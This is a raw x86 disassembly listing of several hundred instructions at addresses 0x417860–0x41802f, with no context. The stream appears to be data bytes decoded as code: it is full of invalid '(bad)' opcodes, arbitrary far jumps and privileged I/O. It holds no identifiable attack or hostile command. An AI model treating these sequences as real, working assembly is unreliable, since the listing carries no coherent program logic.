  417860:	or     BYTE PTR [edi-0xd3a8bb],bh
  417866:	ds sbb eax,0x44b0c806
  41786c:	add    DWORD PTR [edx-0xb],esp
  41786f:	mov    ch,0x14
  417871:	pop    esp
  417872:	adc    eax,0xd07218b6
  417877:	fld    QWORD PTR [edi-0x77fbe650]
  41787d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41787e:	nop
  41787f:	ins    DWORD PTR es:[edi],dx
  417880:	mov    al,bh
  417882:	call   0x756c:0xa96a0d07
  417889:	in     eax,0xd1
  41788b:	imul   esp,edi,0x251d74e2
  417891:	ror    DWORD PTR [ecx+0x25e6fd85],1
  417897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417898:	sar    BYTE PTR [esi],0x0
  41789b:	cld    
  41789c:	push   cs
  41789d:	pop    eax
  41789e:	push   0x22
  4178a0:	add    DWORD PTR [edi+0x24ff61e5],edi
  4178a6:	push   ecx
  4178a7:	sahf   
  4178a8:	ret    0xe944
  4178ab:	sbb    DWORD PTR [edi-0x4e],ebx
  4178ae:	jmp    0x417911
  4178b0:	pusha  
  4178b1:	ret    0xa360
  4178b4:	popf   
  4178b5:	or     BYTE PTR [edx+ebp*1],0xd9
  4178b9:	das    
  4178ba:	xchg   edi,eax
  4178bb:	pop    ss
  4178bc:	out    0xd0,al
  4178be:	shl    BYTE PTR [ecx+0x4e6a0bdd],cl
  4178c4:	fld    DWORD PTR [eax]
  4178c6:	jmp    0x704a81c3
  4178cb:	mov    bl,0x85
  4178cd:	xor    BYTE PTR [edx+0x62d90def],dl
  4178d3:	bound  esp,QWORD PTR [edi]
  4178d5:	mov    BYTE PTR [ecx+0x3d4e6059],dh
  4178db:	jecxz  0x41787d
  4178dd:	or     al,0x6d
  4178df:	add    bl,dl
  4178e1:	add    cl,ch
  4178e3:	pop    eax
  4178e4:	nop
  4178e5:	or     al,0x0
  4178e7:	enter  0xeb,0x0
  4178eb:	dec    ebx
  4178ec:	in     al,0x4
  4178ee:	mov    dl,0xc0
  4178f0:	adc    al,0x6a
  4178f2:	call   FWORD PTR [ebx]
  4178f4:	fdivr  QWORD PTR [eax+0x4]
  4178f7:	cmp    DWORD PTR ds:0xd15c4589,ebx
  4178fd:	add    al,0x73
  4178ff:	add    al,ah
  417901:	outs   dx,DWORD PTR ds:[esi]
  417902:	mov    dh,0xc0
  417904:	sbb    BYTE PTR [edx-0x18487424],0x10
  41790b:	test   DWORD PTR [edx],esi
  41790d:	lahf   
  41790e:	push   ss
  41790f:	push   ecx
  417910:	hlt    
  417911:	fadd   DWORD PTR [ebp-0x768f3175]
  417917:	dec    ebp
  417918:	rol    DWORD PTR [edi+ebx*1],cl
  41791b:	mov    ds:0xc07fdcca,eax
  417920:	cs call 0x874c:0xe39b4589
  417928:	mov    ebx,0x8c7ec459
  41792d:	sub    eax,0xbc3c74fd
  417932:	mov    DWORD PTR [ebp-0x79],edx
  417935:	jecxz  0x41797e
  417937:	or     bl,dh
  417939:	(bad)  [ecx-0x3ea674ff]
  41793f:	jne    0x4178de
  417941:	jecxz  0x417982
  417943:	loopne 0x417945
  417945:	xor    BYTE PTR [ebp+0x7aa50e50],al
  41794b:	adc    al,0x5a
  41794d:	and    BYTE PTR [ebp-0x79],dh
  417950:	cmp    esp,esp
  417952:	dec    edi
  417953:	or     al,0x0
  417955:	and    DWORD PTR [eax+ebp*8],eax
  417958:	scas   eax,DWORD PTR es:[edi]
  417959:	cmp    bh,ah
  41795b:	(bad)  
  41795c:	mov    esi,0x6207701c
  417961:	cld    
  417962:	shl    ah,0x0
  417965:	inc    esp
  417966:	mov    dl,0x56
  417968:	xchg   ecx,eax
  417969:	call   0x5e7dd4a2
  41796e:	jmp    0x417928
  417970:	(bad)  [esi-0x78794082]
  417976:	retf   0x5376
  417979:	ss leave 
  41797b:	xlat   BYTE PTR ds:[ebx]
  41797c:	cld    
  41797d:	adc    eax,0x97d706c7
  417982:	jp     0x417a03
  417984:	dec    ebx
  417985:	push   es
  417986:	xlat   BYTE PTR ds:[ebx]
  417987:	(bad)  
  417988:	dec    DWORD PTR [eax]
  41798a:	mov    BYTE PTR [esi+0x5cb69f88],bh
  417990:	sub    ebp,ebp
  417992:	outs   dx,BYTE PTR ds:[esi]
  417993:	inc    esi
  417994:	xor    DWORD PTR [edx],esp
  417996:	xor    bh,BYTE PTR [edi]
  417998:	mov    DWORD PTR [edi-0x76],eax
  41799b:	or     BYTE PTR [ebx-0x2a],0x86
  41799f:	xadd   BYTE PTR [edx+0x62029522],bh
  4179a6:	xor    al,0xfd
  4179a8:	jmp    eax
  4179aa:	lea    edi,[ecx+0xde3e80]
  4179b0:	add    BYTE PTR [ecx],dl
  4179b2:	lds    ebp,FWORD PTR [edx+0x20ada554]
  4179b8:	pusha  
  4179b9:	jmp    0x417968
  4179bb:	and    BYTE PTR [eax],ah
  4179bd:	out    0xb5,eax
  4179bf:	and    BYTE PTR [eax],bl
  4179c1:	jp     0x41794a
  4179c3:	stos   BYTE PTR es:[edi],al
  4179c4:	cld    
  4179c5:	test   ebp,edi
  4179c7:	inc    esp
  4179c8:	or     eax,0x4e1e600
  4179cd:	add    BYTE PTR [edx-0xb],ah
  4179d0:	mov    eax,0x5b5a5623
  4179d5:	pop    edx
  4179d6:	idiv   BYTE PTR gs:[ebx-0x40]
  4179da:	ins    DWORD PTR es:[edi],dx
  4179db:	fldcw  WORD PTR [ebp+eiz*1+0x62]
  4179df:	fldl2t 
  4179e1:	adc    DWORD PTR [ebx],ebp
  4179e3:	pop    ebx
  4179e4:	inc    esi
  4179e5:	in     al,dx
  4179e6:	fcomp  DWORD PTR ds:0x54920c06
  4179ec:	mov    dh,0x1f
  4179ee:	jb     0x417a61
  4179f0:	pop    gs
  4179f2:	cs ins DWORD PTR es:[di],dx
  4179f5:	inc    esp
  4179f6:	push   edi
  4179f7:	pop    esp
  4179f8:	jns    0x4179fe
  4179fa:	(bad)  
  4179fb:	fldcw  WORD PTR [esi-0x48]
  4179fe:	inc    ecx
  4179ff:	mov    eax,ds:0xa541c06e
  417a04:	push   0xb666243
  417a09:	inc    ebp
  417a0a:	jecxz  0x417995
  417a0c:	add    edi,DWORD PTR [edi+0x22]
  417a0f:	xlat   BYTE PTR ds:[ebx]
  417a10:	bound  ebp,QWORD PTR [edx+eiz*2-0x27]
  417a14:	jmp    0xf199d3ea
  417a19:	add    ebx,edi
  417a1b:	inc    esi
  417a1c:	jmp    0x6203:0xea53def4
  417a23:	or     BYTE PTR [ebp-0x49],ah
  417a26:	add    ecx,0x661b28c1
  417a2c:	ret    
  417a2d:	jle    0x417a2f
  417a2f:	mov    ds:0x1e793dec,al
  417a34:	mov    ebp,0x384c5bf1
  417a39:	jmp    0x6dab6541
  417a3e:	dec    ebp
  417a3f:	push   cs
  417a40:	stc    
  417a41:	outs   dx,BYTE PTR ds:[esi]
  417a42:	mov    DWORD PTR [ecx-0x5f],0x1dd9555e
  417a49:	(bad)  
  417a4a:	jecxz  0x417a79
  417a4c:	and    dl,ch
  417a4e:	repz jne 0x417ab7
  417a51:	mov    edi,0x19edb4a
  417a56:	out    0xa6,al
  417a58:	daa    
  417a59:	push   ecx
  417a5a:	adc    al,0xd5
  417a5c:	adc    eax,0xd3b60925
  417a61:	pop    esp
  417a62:	pop    esi
  417a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a64:	push   eax
  417a65:	leave  
  417a66:	ins    BYTE PTR es:[edi],dx
  417a67:	mov    dl,ch
  417a69:	sbb    al,0x62
  417a6b:	std    
  417a6c:	mov    ecx,0xb099ea60
  417a71:	clc    
  417a72:	mov    eax,fs:0x9e6c04e7
  417a78:	jmp    0x70c2:0xb05c62ca
  417a7f:	aad    0xb9
  417a81:	sbb    dl,bl
  417a83:	dec    eax
  417a84:	jo     0x417a8b
  417a86:	(bad)  
  417a87:	lds    edi,FWORD PTR [ecx-0x15c79be8]
  417a8d:	or     eax,0x1cb9ad72
  417a92:	cdq    
  417a93:	add    BYTE PTR [edi-0x5e08ef83],bh
  417a99:	xchg   DWORD PTR fs:[ecx],edx
  417a9c:	pop    edx
  417a9d:	xchg   edi,eax
  417a9e:	jmp    0xfca7b951
  417aa3:	ins    BYTE PTR es:[edi],dx
  417aa4:	mov    dl,0xb9
  417aa6:	adc    al,0xc1
  417aa8:	in     eax,dx
  417aa9:	(bad)  
  417aaa:	sti    
  417aab:	into   
  417aac:	jmp    0x2514:0xd2dc767f
  417ab3:	aad    0x79
  417ab5:	scas   al,BYTE PTR es:[edi]
  417ab6:	push   esi
  417ab7:	mov    dh,0x21
  417ab9:	pop    edx
  417aba:	rcr    esi,0xe5
  417abd:	mov    ecx,0x7021a6fb
  417ac2:	(bad)  
  417ac3:	fisubr DWORD PTR [eax+ebx*2]
  417ac6:	jge    0x417a95
  417ac8:	ins    DWORD PTR es:[edi],dx
  417ac9:	fnstenv [eax+eiz*8-0x2e]
  417acd:	adc    al,0x25
  417acf:	add    BYTE PTR [edi-0x13a6494f],dl
  417ad5:	sbb    DWORD PTR [esi+0x5e],ebx
  417ad8:	dec    esi
  417ad9:	push   edi
  417ada:	ret    0xc85b
  417add:	adc    DWORD PTR [ebp-0x3e],ecx
  417ae0:	push   ebx
  417ae1:	(bad)  [ebx+0x53]
  417ae4:	push   ss
  417ae5:	adc    DWORD PTR [ebp+0x33],0xffffff90
  417ae9:	mov    WORD PTR [ecx+0x6a],ss
  417aec:	dec    eax
  417aed:	mov    WORD PTR [edx+0x7],gs
  417af0:	adc    ebx,ecx
  417af2:	add    BYTE PTR [eax],al
  417af4:	mov    ebx,0x247518
  417af9:	sub    edx,DWORD PTR [esi+0x4d]
  417afc:	and    al,0x1f
  417afe:	push   esp
  417aff:	cli    
  417b00:	mov    esi,DWORD PTR [eax+0x18]
  417b03:	adc    ah,ah
  417b05:	or     DWORD PTR [ecx+0x5c6b8afc],ebx
  417b0b:	sti    
  417b0c:	call   edi
  417b0e:	(bad)  
  417b0f:	push   ecx
  417b10:	push   ebx
  417b11:	fdiv   DWORD PTR [esi]
  417b13:	add    dl,BYTE PTR [ebx-0x2b]
  417b16:	pop    ss
  417b17:	adc    BYTE PTR [ecx+ecx*1-0x2c750367],bh
  417b1e:	push   ecx
  417b1f:	(bad)  
  417b20:	jne    0x417af4
  417b22:	cmp    ch,0x15
  417b25:	jecxz  0x417af5
  417b27:	inc    eax
  417b28:	add    BYTE PTR [eax+0x67448973],ah
  417b2e:	mov    ecx,0x8c6b70fd
  417b33:	push   ecx
  417b34:	push   0xffffffc7
  417b36:	jg     0x417b35
  417b38:	adc    eax,0x40cee3
  417b3d:	add    BYTE PTR [eax-0x48881281],dh
  417b43:	mov    DWORD PTR [edi+eiz*4-0x3c],eax
  417b47:	mov    DWORD PTR [edx+eiz*2-0x6a],ecx
  417b4b:	adc    ch,bh
  417b4d:	repnz xchg ecx,eax
  417b4f:	(bad)  
  417b51:	sbb    DWORD PTR [ebp+0x3f],ebx
  417b54:	std    
  417b55:	fdivr  DWORD PTR [edx]
  417b57:	mov    ebx,ebp
  417b59:	out    dx,al
  417b5a:	jb     0x417b35
  417b5c:	cld    
  417b5d:	add    BYTE PTR [edi-0x5a],dh
  417b60:	adc    eax,0x3ef56240
  417b65:	je     0x417bcc
  417b67:	sub    edi,DWORD PTR [edi]
  417b69:	adc    ebp,edx
  417b6b:	pop    edi
  417b6c:	sar    bh,0xe6
  417b6f:	or     esi,DWORD PTR [ebx+ecx*1+0x743f1be1]
  417b76:	gs dec esp
  417b78:	aas    
  417b79:	adc    ecx,edx
  417b7b:	jg     0x417b3d
  417b7d:	(bad)  
  417b7e:	mov    esp,0x2189e154
  417b83:	xchg   edi,eax
  417b84:	ffree  st(1)
  417b86:	pop    edx
  417b87:	jb     0x417b63
  417b89:	push   esp
  417b8a:	fld    st(0)
  417b8c:	ds adc edi,edx
  417b8f:	popa   
  417b90:	sar    bh,0xe8
  417b93:	fldcw  WORD PTR [edx]
  417b95:	xor    al,0x31
  417b97:	mov    dl,0xbf
  417b99:	mov    DWORD PTR [eax],ebx
  417b9b:	mov    edi,0xeda5831f
  417ba0:	in     al,dx
  417ba1:	gs gs cmp al,0x43
  417ba5:	mov    ebx,DWORD PTR [eax+eiz*2]
  417ba8:	stos   BYTE PTR es:[edi],al
  417ba9:	and    BYTE PTR [edx-0x149a3050],0x70
  417bb0:	inc    ecx
  417bb1:	adc    ebp,DWORD PTR [esi-0x1f003f7f]
  417bb7:	cdq    
  417bb8:	push   es
  417bb9:	je     0x417b3e
  417bbb:	out    dx,eax
  417bbc:	cmp    al,0x4
  417bbe:	push   ss
  417bbf:	xchg   esi,eax
  417bc0:	test   eax,edi
  417bc2:	add    BYTE PTR [eax-0x27],ah
  417bc5:	sbb    al,0x7
  417bc7:	dec    edx
  417bc8:	sbb    edi,edx
  417bca:	mov    esi,0x142c6373
  417bcf:	call   0x78c575de
  417bd4:	mov    esi,0x99304305
  417bd9:	sbb    esp,edx
  417bdb:	mov    ds:0xae8ce9dc,eax
  417be0:	mov    ebp,0xc79c8edd
  417be5:	jo     0x417baa
  417be7:	popa   
  417be8:	push   esp
  417be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bea:	pop    ds
  417beb:	pop    ds
  417bec:	sbb    edx,esp
  417bee:	push   es
  417bef:	(bad)  
  417bf0:	fldl2t 
  417bf2:	xchg   BYTE PTR [edx],ah
  417bf4:	in     eax,dx
  417bf5:	in     al,dx
  417bf6:	loop   0x417c64
  417bf8:	int    0x4e
  417bfa:	sbb    bl,ch
  417bfc:	sbb    dh,ah
  417bfe:	mov    WORD PTR [edx-0x6ebb9b2f],fs
  417c04:	leave  
  417c05:	(bad)  
  417c06:	push   ebp
  417c07:	in     eax,0x8
  417c09:	cli    
  417c0a:	dec    eax
  417c0b:	inc    ebp
  417c0c:	int    0xe8
  417c0e:	add    esp,DWORD PTR [edx-0x27]
  417c11:	pop    ecx
  417c12:	add    ecx,DWORD PTR [ebx]
  417c14:	sahf   
  417c15:	mov    bh,0x39
  417c17:	fisttp DWORD PTR [ebx-0x13ca057c]
  417c1d:	jmp    0x4e05:0x79a047c5
  417c24:	ja     0x417c8d
  417c26:	inc    ebx
  417c27:	add    BYTE PTR [eax+0x6e],ah
  417c2a:	retf   
  417c2b:	(bad)  
  417c2c:	fidiv  DWORD PTR [ebp+0x67]
  417c2f:	daa    
  417c30:	mov    edx,0x600fbe58
  417c35:	fldl2t 
  417c37:	aam    0x17
  417c39:	dec    esi
  417c3a:	xor    eax,0x1560f10
  417c3f:	aaa    
  417c40:	inc    edx
  417c41:	(bad)  [ecx+0x75ce8a1d]
  417c47:	and    cl,ah
  417c49:	jecxz  0x417c6b
  417c4b:	jmp    0x1e42b5b1
  417c50:	mov    dh,0xe3
  417c52:	jp     0x417c1d
  417c54:	popa   
  417c55:	(bad)  
  417c56:	cld    
  417c57:	jmp    0xffcf7a13
  417c5c:	jne    0x417c6b
  417c5e:	cld    
  417c5f:	fdivr  QWORD PTR [ecx-0x1916bf38]
  417c65:	add    eax,0x14dcbe09
  417c6a:	and    eax,0xe980d6f5
  417c6f:	inc    eax
  417c70:	daa    
  417c71:	gs cld 
  417c73:	mov    eax,fs:0x9e7246ed
  417c79:	jno    0x417c32
  417c7b:	pop    eax
  417c7c:	popa   
  417c7d:	fnstcw WORD PTR [edi+0x31]
  417c80:	fs out 0x1b,al
  417c83:	ficomp WORD PTR [edx+0x496a0918]
  417c89:	loope  0x417cff
  417c8b:	in     al,0x0
  417c8d:	fisub  WORD PTR [eax+0x59]
  417c90:	pushf  
  417c91:	push   eax
  417c92:	adc    cl,BYTE PTR [eax-0x722e0263]
  417c98:	lods   eax,DWORD PTR ds:[esi]
  417c99:	add    eax,0x4b1150c6
  417c9e:	pop    esi
  417c9f:	cld    
  417ca0:	test   BYTE PTR [ecx-0x4262782c],0xcd
  417ca7:	push   edx
  417ca8:	je     0x417c44
  417caa:	mov    ch,0x14
  417cac:	cmp    DWORD PTR [esi-0x5f],esi
  417caf:	cli    
  417cb0:	(bad)  
  417cb1:	jge    0x417d10
  417cb3:	rcl    DWORD PTR [ebp+0x52],0x4e
  417cb7:	push   ebp
  417cb8:	add    BYTE PTR [edi-0x33],bl
  417cbb:	push   ebp
  417cbc:	mov    esi,ecx
  417cbe:	mov    ah,0xd6
  417cc0:	out    dx,al
  417cc1:	mov    dl,ch
  417cc3:	pop    ebp
  417cc4:	pop    esi
  417cc5:	sbb    ebx,esp
  417cc7:	pop    ecx
  417cc8:	mov    ebx,esi
  417cca:	ja     0x417c8e
  417ccc:	or     BYTE PTR [ebx-0x75],bh
  417ccf:	mov    ecx,esi
  417cd1:	cmp    al,0x4e
  417cd3:	inc    ebx
  417cd4:	or     BYTE PTR [esi],dl
  417cd6:	xchg   ebx,eax
  417cd7:	add    BYTE PTR [ebp+0x5508f],cl
  417cdd:	jnp    0x417cb4
  417cdf:	call   0x1183203
  417ce4:	test   BYTE PTR [ebx],cl
  417ce6:	and    edi,edi
  417ce8:	adc    BYTE PTR [ebx-0x47d61660],0x99
  417cef:	and    BYTE PTR [eax+eax*1],cl
  417cf2:	dec    ebx
  417cf3:	sub    DWORD PTR [ebx],edx
  417cf5:	mov    edx,ebp
  417cf7:	aam    0x89
  417cf9:	inc    esi
  417cfa:	aas    
  417cfb:	xor    eax,DWORD PTR [eax]
  417cfd:	(bad)  
  417cfe:	out    dx,eax
  417cff:	js     0x417d0d
  417d01:	lea    ecx,[edi]
  417d03:	push   ebp
  417d04:	push   ecx
  417d05:	jmp    FWORD PTR [esi]
  417d07:	adc    DWORD PTR [esi],0xc55bfb40
  417d0d:	or     al,0x90
  417d0f:	xchg   edi,eax
  417d10:	add    al,0x8d
  417d12:	ret    
  417d13:	aad    0x83
  417d15:	dec    esi
  417d16:	add    eax,DWORD PTR [eax-0x23003da2]
  417d1c:	push   edx
  417d1d:	mov    ebp,edx
  417d1f:	xchg   DWORD PTR [ecx+0x699ac356],ecx
  417d25:	shr    bl,cl
  417d27:	dec    ecx
  417d28:	dec    ebx
  417d29:	add    al,0xb3
  417d2b:	add    DWORD PTR [eax-0x3ea744ff],ebx
  417d31:	jne    0x417d95
  417d33:	ins    DWORD PTR es:[edi],dx
  417d34:	jg     0x417cfe
  417d36:	mov    ch,0x9b
  417d38:	in     eax,dx
  417d39:	sub    BYTE PTR [esi],0xce
  417d3c:	adc    BYTE PTR [eax],al
  417d3e:	cs jns 0x417cc8
  417d41:	inc    esi
  417d42:	push   0x1b
  417d44:	inc    ebp
  417d45:	pusha  
  417d46:	popa   
  417d47:	mov    eax,0x37026a08
  417d4c:	mov    ah,0x23
  417d4e:	jb     0x417cf2
  417d50:	cmp    edx,DWORD PTR [ebx]
  417d52:	push   ds
  417d53:	pusha  
  417d54:	sar    bh,0x0
  417d57:	loopne 0x417d8f
  417d59:	or     al,0x89
  417d5b:	and    al,0x6a
  417d5d:	xchg   ecx,eax
  417d5e:	dec    eax
  417d5f:	arpl   cx,bp
  417d61:	int    0x7
  417d63:	mov    ebp,0x62043ec8
  417d68:	enter  0xef87,0xd9
  417d6c:	and    eax,0x37d907e4
  417d71:	or     BYTE PTR [ecx+0x2b],ch
  417d74:	xchg   edx,eax
  417d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d76:	mov    edi,0x7e9127c2
  417d7b:	data16 jae 0x417d89
  417d7e:	add    DWORD PTR [ebp-0x25],ebx
  417d81:	or     esi,DWORD PTR [edx+0x69]
  417d84:	inc    edx
  417d85:	xchg   ecx,eax
  417d86:	dec    edi
  417d87:	sbb    BYTE PTR [edx],0x2
  417d8a:	popf   
  417d8b:	arpl   WORD PTR [edx+0x27],si
  417d8e:	add    dl,BYTE PTR [eax-0x4e]
  417d91:	add    eax,0x76
  417d94:	bound  edi,QWORD PTR [ebx]
  417d96:	dec    esi
  417d97:	push   0xfffffffb
  417d99:	aad    0x7
  417d9b:	jns    0x417d61
  417d9d:	lahf   
  417d9e:	mov    BYTE PTR ds:0x639aa4ca,dl
  417da4:	jb     0x417d81
  417da6:	pop    ebp
  417da7:	mov    al,ds:0x36890075
  417dac:	(bad)  ds:0xf20a8b08
  417db2:	mov    al,0x6f
  417db4:	push   edx
  417db5:	cmp    DWORD PTR [ebx+ecx*2],ecx
  417db8:	mov    ecx,DWORD PTR [edx-0x7f]
  417dbb:	add    ch,ch
  417dbd:	aam    0xd1
  417dbf:	(bad)  
  417dc0:	enter  0xe9d9,0x41
  417dc4:	data16 fnstcw WORD PTR [ebx+0x25e66207]
  417dcb:	add    al,0x8d
  417dcd:	in     al,0xe4
  417dcf:	aad    0xc7
  417dd1:	fcom   QWORD PTR ds:0x93057dc8
  417dd7:	pop    ss
  417dd8:	es retf 
  417dda:	sub    DWORD PTR [edx+eax*8],eax
  417ddd:	fdivr  st,st(4)
  417ddf:	(bad)  
  417de0:	gs aaa 
  417de2:	jmp    0xcd9bfc9d
  417de7:	lahf   
  417de8:	retf   
  417de9:	adc    eax,0xd85e03ea
  417dee:	sub    eax,DWORD PTR [edi]
  417df0:	icebp  
  417df1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417df3:	add    esp,DWORD PTR [edx-0x6a]
  417df6:	in     eax,dx
  417df7:	pop    es
  417df8:	mov    cl,0x15
  417dfa:	jmp    0x6261:0xea19fc8a
  417e01:	in     al,0xa5
  417e03:	add    esi,DWORD PTR [esi+ebx*2+0x1973c3dd]
  417e0a:	jmp    0xf588:0xbc0b22dd
  417e11:	jno    0x417dd6
  417e13:	es (bad) 
  417e15:	fldcw  WORD PTR [edx]
  417e17:	push   es
  417e18:	(bad)  
  417e19:	ds stos BYTE PTR es:[edi],al
  417e1b:	add    esi,DWORD PTR [ebx]
  417e1d:	xor    BYTE PTR [ebp-0x3a],0x0
  417e21:	ins    DWORD PTR es:[edi],dx
  417e22:	or     DWORD PTR [ecx-0x62],esi
  417e25:	cli    
  417e26:	fld    DWORD PTR [eax]
  417e28:	jmp    0x4ddcd48e
  417e2d:	data16 fld DWORD PTR [eax]
  417e30:	scas   al,BYTE PTR es:[edi]
  417e31:	fild   WORD PTR [ebp+0x1]
  417e34:	jmp    0x29ddcf9a
  417e39:	pop    esi
  417e3a:	push   ecx
  417e3b:	fwait
  417e3c:	mov    DWORD PTR [ecx-0x27],esp
  417e3f:	add    dh,al
  417e41:	dec    esp
  417e42:	mov    eax,ds:0x5666290e
  417e47:	fwait
  417e48:	pop    ecx
  417e49:	popa   
  417e4a:	fld    DWORD PTR [eax]
  417e4c:	bound  esp,QWORD PTR [edi]
  417e4e:	call   DWORD PTR [edi-0x56]
  417e51:	scas   al,BYTE PTR es:[edi]
  417e52:	push   ecx
  417e53:	cli    
  417e54:	ins    BYTE PTR es:[edi],dx
  417e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e56:	out    0x50,al
  417e58:	scas   al,BYTE PTR es:[edi]
  417e59:	pop    esi
  417e5a:	cmp    eax,0x5c66299c
  417e5f:	push   ss
  417e60:	pop    ebp
  417e61:	push   ebx
  417e62:	sbb    DWORD PTR [ecx],eax
  417e64:	jb     0x417e4c
  417e66:	dec    eax
  417e67:	add    ecx,ebp
  417e69:	popa   
  417e6a:	pop    edx
  417e6b:	shl    ebp,0x66
  417e6e:	or     esp,edi
  417e70:	cld    
  417e71:	pop    ebp
  417e72:	into   
  417e73:	inc    eax
  417e74:	jmp    0x7df5d190
  417e79:	popa   
  417e7a:	fld    DWORD PTR [eax]
  417e7c:	bound  ebx,QWORD PTR [edi-0x398efc6c]
  417e82:	sbb    BYTE PTR [ecx],al
  417e84:	push   ecx
  417e85:	add    BYTE PTR [eax],al
  417e87:	rol    BYTE PTR [eax],0xe9
  417e8a:	jmp    0xa0c5:0x6726050e
  417e91:	test   eax,0x7de57161
  417e96:	pusha  
  417e97:	fld    DWORD PTR [edi-0x1a73b6da]
  417e9d:	jmp    0x86e603
  417ea2:	pop    ss
  417ea3:	into   
  417ea4:	sti    
  417ea5:	pop    ebp
  417ea6:	push   edi
  417ea7:	aad    0x89
  417ea9:	iret   
  417eaa:	arpl   WORD PTR [ebx*4-0x39af44ff],cx
  417eb1:	pop    edi
  417eb2:	stc    
  417eb3:	fadd   DWORD PTR [eax]
  417eb5:	push   ebx
  417eb6:	jne    0x417e65
  417eb8:	pusha  
  417eb9:	inc    ebp
  417eba:	mov    WORD PTR [ecx-0x2e988b03],fs
  417ec0:	mov    DWORD PTR ds:0x402e3f,ecx
  417ec6:	adc    ebp,edi
  417ec8:	std    
  417ec9:	push   ecx
  417eca:	fwait
  417ecb:	dec    esi
  417ecc:	icebp  
  417ecd:	test   al,dh
  417ecf:	sub    BYTE PTR [edx],bl
  417ed1:	test   ebp,esp
  417ed3:	sub    BYTE PTR [ebx],cl
  417ed5:	call   DWORD PTR [edi+0x79]
  417ed8:	or     BYTE PTR [ebx+0x446a457e],cl
  417ede:	jnp    0x417f0b
  417ee0:	sti    
  417ee1:	out    0x53,eax
  417ee3:	mov    eax,0x22f30000
  417ee8:	aas    
  417ee9:	inc    DWORD PTR [eax]
  417eeb:	int3   
  417eec:	dec    esp
  417eed:	ret    
  417eee:	pop    esi
  417eef:	jo     0x417f04
  417ef1:	add    eax,0xed4c0600
  417ef6:	sub    DWORD PTR [edi+0x3c5586d1],0xffffff84
  417efd:	push   esi
  417efe:	mov    ecx,DWORD PTR [edx-0x5af0269d]
  417f04:	adc    al,0x82
  417f06:	call   0x4871ac16
  417f0b:	xlat   BYTE PTR ds:[ebx]
  417f0c:	les    ecx,FWORD PTR [eax+0x75]
  417f0f:	(bad)  
  417f10:	push   ecx
  417f11:	inc    eax
  417f12:	dec    ebx
  417f14:	push   ecx
  417f15:	inc    eax
  417f16:	clc    
  417f17:	mov    ebx,0x62f44051
  417f1c:	and    dh,BYTE PTR [edi]
  417f1e:	jae    0x417f7e
  417f20:	and    DWORD PTR [ebx+0x15fface],ecx
  417f26:	add    BYTE PTR [edx-0x39],ah
  417f29:	jmp    0x6269:0xd0631f8a
  417f30:	pop    eax
  417f31:	add    ch,bh
  417f33:	dec    edi
  417f34:	data16 aad 0x88
  417f37:	lods   al,BYTE PTR ds:[esi]
  417f38:	mov    dh,dh
  417f3a:	add    ah,BYTE PTR [edx+0x72]
  417f3d:	sub    edx,DWORD PTR [ebx]
  417f3f:	cmp    BYTE PTR [edx+0x37],dh
  417f42:	jae    0x417f92
  417f44:	out    0x49,eax
  417f46:	std    
  417f47:	pop    ss
  417f48:	xor    BYTE PTR [edi],0x73
  417f4b:	and    si,WORD PTR [ecx+0x517a0007]
  417f52:	add    eax,DWORD PTR [eax]
  417f54:	(bad)  
  417f55:	call   0xc6d203a9
  417f5a:	sbb    al,BYTE PTR [eax+0x6b17079]
  417f60:	sub    BYTE PTR [edi],bl
  417f62:	lods   al,BYTE PTR ds:[esi]
  417f63:	push   cs
  417f64:	loop   0x417fbe
  417f66:	add    esi,DWORD PTR [esi+ebp*2-0xe]
  417f6a:	cmp    eax,0x3a73d1ff
  417f6f:	shl    edx,0xe6
  417f72:	add    dh,BYTE PTR [edx-0x2b]
  417f75:	inc    ecx
  417f76:	add    eax,0x45a9995e
  417f7b:	adc    BYTE PTR [edx-0x40],ah
  417f7e:	inc    esp
  417f7f:	jmp    0x1c656eb8
  417f84:	xchg   ecx,eax
  417f85:	cmp    eax,0x86fe2b8b
  417f8a:	mov    esp,0x783bafff
  417f8f:	mov    eax,0xfd003675
  417f94:	xor    bl,cl
  417f96:	outs   dx,BYTE PTR ds:[esi]
  417f97:	mov    bh,0x41
  417f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f9a:	(bad)  
  417f9b:	dec    esp
  417f9c:	jecxz  0x417f7a
  417f9e:	int    0xf7
  417fa0:	adc    DWORD PTR [eax+0x1a],0xd6b5968b
  417fa7:	scas   eax,DWORD PTR es:[edi]
  417fa8:	fwait
  417fa9:	pop    eax
  417faa:	jle    0x417f8b
  417fac:	cdq    
  417fad:	jmp    0x417f91
  417faf:	and    BYTE PTR [esi],0xda
  417fb2:	jmp    0xe5087fba
  417fb7:	or     eax,0x614eac0
  417fbc:	shl    BYTE PTR ds:0x22d1aea8,0x8
  417fc3:	pop    edi
  417fc4:	inc    edi
  417fc5:	mov    edx,0x9f39c2ad
  417fca:	push   esp
  417fcb:	stos   BYTE PTR es:[edi],al
  417fcc:	or     ecx,esp
  417fce:	mov    bl,0xe8
  417fd0:	add    esp,DWORD PTR [edx+0x4]
  417fd3:	pop    ss
  417fd4:	lea    ebx,[ecx+0x62202270]
  417fda:	fnstenv [edx]
  417fdc:	cmp    DWORD PTR [ecx],edx
  417fde:	test   eax,0x5b6d0f80
  417fe3:	jmp    0x3af5:0x29b51e8c
  417fea:	pop    ss
  417feb:	rcr    DWORD PTR [ebx],0x67
  417fee:	inc    ebp
  417fef:	stos   BYTE PTR es:[edi],al
  417ff0:	and    BYTE PTR [edx],0xcb
  417ff3:	add    eax,DWORD PTR gs:[ebp+0x5b]
  417ff7:	jmp    0x298c:0xb702acd2
  417ffe:	jb     0x41801f
  418000:	and    eax,0xc060d962
  418005:	and    DWORD PTR [ebp+0x556f446c],0xd9620450
  41800f:	add    BYTE PTR [esi+esi*8+0x59],ah
  418013:	add    ch,cl
  418015:	popa   
  418016:	push   edx
  418017:	push   ebp
  418018:	int    0x0
  41801a:	ins    DWORD PTR es:[edi],dx
  41801b:	pop    eax
  41801c:	mov    bh,0x6d
  41801e:	pop    esi
  41801f:	fld    DWORD PTR [eax]
  418021:	jmp    0xd961:0xe9c6565a
  418028:	lea    esi,[ecx-0x3ab2abef]
  41802e:	ins    DWORD PTR es:[edi],dx
  41802f:	push   eax
